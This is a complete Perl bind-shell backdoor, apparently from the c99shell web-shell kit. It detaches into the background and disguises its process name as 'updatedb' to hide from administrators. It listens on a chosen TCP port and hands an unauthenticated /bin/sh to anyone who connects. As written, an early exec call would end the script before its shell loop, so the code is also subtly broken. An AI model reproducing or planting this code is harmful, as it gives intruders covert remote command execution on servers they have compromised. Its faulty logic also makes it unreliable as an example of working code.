#!/usr/bin/perl
if (@ARGV < 1) {exit(1);}
$port = $ARGV[0];
exit if fork;
$0 = "updatedb" . " " x100;
$SIG{CHLD} = 'IGNORE';
use Socket;
socket(S, PF_INET, SOCK_STREAM, 0);
setsockopt(S, SOL_SOCKET, SO_REUSEADDR, 1);
bind(S, sockaddr_in($port, INADDR_ANY));
listen(S, 50);
accept(X,S);
open STDIN, "<&X";
open STDOUT, ">&X";
open STDERR, ">&X";
exec("echo \"Welcome to c99shell!\r\n\r\n\"");
while(1)
{
 accept(X, S);
 unless(fork)
 {
  open STDIN, "<&X";
  open STDOUT, ">&X";
  close X;
  exec("/bin/sh");
 }
 close X;
}